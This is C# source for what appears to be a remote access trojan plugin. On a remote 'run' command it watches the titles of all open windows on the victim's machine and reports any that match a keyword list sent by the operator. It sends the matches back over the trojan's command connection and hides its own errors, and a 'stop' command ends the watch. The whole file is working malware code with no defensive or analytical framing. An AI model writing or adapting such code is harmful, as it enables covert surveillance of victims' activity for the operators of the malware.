using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Threading;
using MessagePackLib.MessagePack;

namespace Plugin.Handler
{
    internal class HandleReportWindow
    {
        private List<string> title;

        public HandleReportWindow(MsgPack unpack_msgpack)
        {
            switch (unpack_msgpack.ForcePathObject("Option").AsString)
            {
                case "run":
                {
                    try
                    {
                        Initialize(unpack_msgpack);
                        var count = 30;
                        while (!Packet.ctsReportWindow.IsCancellationRequested)
                        {
                            foreach (var window in Process.GetProcesses())
                            {
                                if (string.IsNullOrEmpty(window.MainWindowTitle))
                                    continue;
                                if (title.Any(window.MainWindowTitle.ToLower().Contains) && count > 30)
                                {
                                    count = 0;
                                    SendReport(window.MainWindowTitle.ToLower());
                                }
                            }

                            count++;
                            Thread.Sleep(1000);
                        }
                    }
                    catch
                    {
                    }

                    break;
                }

                case "stop":
                {
                    Packet.ctsReportWindow?.Cancel();
                    Connection.Disconnected();
                    break;
                }
            }
        }

        private void Initialize(MsgPack unpack_msgpack)
        {
            Packet.ctsReportWindow?.Cancel();
            Packet.ctsReportWindow = new CancellationTokenSource();

            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "reportWindow-";
            Connection.Send(msgpack.Encode2Bytes());

            title = new List<string>();
            foreach (var s in unpack_msgpack.ForcePathObject("Title").AsString.ToLower()
                         .Split(new[] { "," }, StringSplitOptions.None))
                title.Add(s.Trim());
        }

        private void SendReport(string window)
        {
            Debug.WriteLine(window);
            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "reportWindow";
            msgpack.ForcePathObject("Report").AsString = window;
            Connection.Send(msgpack.Encode2Bytes());
        }
    }
}